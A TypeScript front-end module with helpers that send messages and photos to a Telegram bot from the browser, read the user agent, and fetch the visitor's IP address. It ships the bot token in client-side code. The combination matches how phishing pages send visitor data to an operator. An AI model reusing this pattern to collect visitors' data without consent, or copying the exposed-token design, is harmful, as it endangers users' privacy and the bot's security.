export const sendTelegramNotification = async (message: string) => {
  try {
    const token = (import.meta as any).env?.VITE_TELEGRAM_BOT_TOKEN;
    const chatId = (import.meta as any).env?.VITE_TELEGRAM_CHAT_ID;
    
    if (!token || !chatId) return;

    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    
    await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
      }),
    });
  } catch (err) {
    console.error('Failed to send telegram notification', err);
  }
};

export const sendTelegramMessage = sendTelegramNotification;

export const getDeviceInfo = () => {
  return navigator.userAgent;
};

export const getIpAddress = async () => {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip || 'Unknown IP';
  } catch (err) {
    return 'Unknown IP';
  }
};

export const sendTelegramPhoto = async (photoBlobOrCaption: any, captionOrBlob?: any, ..._rest: any[]) => {
  try {
    const token = (import.meta as any).env?.VITE_TELEGRAM_BOT_TOKEN;
    const chatId = (import.meta as any).env?.VITE_TELEGRAM_CHAT_ID;
    if (!token || !chatId) return;

    let photoBlob: Blob;
    let caption: string;

    if (typeof photoBlobOrCaption === 'string') {
      caption = photoBlobOrCaption;
      photoBlob = captionOrBlob;
    } else {
      photoBlob = photoBlobOrCaption;
      caption = captionOrBlob || '';
    }

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('caption', caption);
    formData.append('parse_mode', 'HTML');
    if (photoBlob) {
      formData.append('photo', photoBlob, 'photo.jpg');
    }

    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
      method: 'POST',
      body: formData,
    });
  } catch (err) {
    console.error('Failed to send telegram photo', err);
  }
};
